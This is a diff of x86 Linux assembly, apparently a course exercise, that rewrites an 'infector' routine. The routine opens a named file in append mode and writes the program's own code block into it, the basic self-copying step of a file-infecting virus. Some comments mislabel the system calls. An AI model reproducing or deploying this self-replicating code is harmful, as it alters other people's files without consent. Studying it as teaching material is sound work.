@@ -60,7 +60,7 @@ infection:
     mov     ecx, msg      ; Next argument...  ;STRING
     mov     edx, len      ; Next argument... ; length of string
     int     0x80            ; Transfer control to operating system
-
+    
     popad                   ; Restore caller state (registers)
     mov     eax, [ebp-4]    ; place returned value where caller can see it
     add     esp, 4          ; Restore caller state
@@ -71,32 +71,53 @@ infection:
 infector:
     push    ebp             ; Save caller state
     mov     ebp, esp
-    sub     esp, 4          ; Leave space for local var on stack
     pushad                  ; Save some more caller state
-                            ;OPEN
+     
+    open:                        ;OPEN
     mov     eax, 5          ; Copy function args to registers: leftmost...    ; SYSWRITE    
-    mov     ebx, 1024          ; Next argument...   ;STDOUT
-    mov     ecx, [ebp + 8]      ; Next argument...  ;STRING
+    mov     ebx, [ebp + 8]        ; Next argument...   ;STDOUT
+    mov     ecx,  1025    ; Next argument...  ;STRING
     mov     edx, 0777      ; Next argument... ; length of string
     int     0x80            ; Transfer control to operating system
-    mov     [ebp - 4], eax    ; Save returned value...
-                            ;WRITE
-
+    mov     esi, eax    ; Save returned value...
+   
+    write:
     mov     eax, 4          ; Copy function args to registers: leftmost...    ; SYSWRITE    
-    mov     ebx, [ebp - 4]  ; Next argument...   ;STDOUT
-    mov     ecx, msg      ; Next argument...  ;STRING
-    mov     edx, len      ; Next argument... ; length of string
+    mov     ebx, esi         ; Next argument...   ;STDOUT
+    mov     ecx, code_start      ; Next argument...  ;STRING
+    mov     edx, code_end      ; Next argument... ; length of string
+    sub     edx, ecx
     int     0x80            ; Transfer control to operating system
-    
-                            ;CLOSE
+ 
+    close:                  ;CLOSE
     mov     eax, 6          ; Copy function args to registers: leftmost...    ; SYSWRITE    
-    mov     ebx, [ebp - 4]      ; Next argument...  ;STRING
+    mov     ebx, esi      ; Next argument...  ;STRING
     int     0x80            ; Transfer control to operating system  
 
     popad                   ; Restore caller state (registers)
-    mov     eax, [ebp - 4]    ; place returned value where caller can see it
-    add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller 
-   
+
+    ; push 0777
+    ; push dword [ebp + 8]
+    ; push 1025
+    ; push 5
+    ; call system_call
+    ; mov edi, eax
+    
+
+    ; push len 
+    ; push msg
+    ; push 1
+    ; push 4
+    ; call system_call
+
+    ; push 0
+    ; push 0
+    ; push edi
+    ; push 6
+    ; call system_call
+    ; cmp eax, 0
+    ; jae infection
+
 code_end:
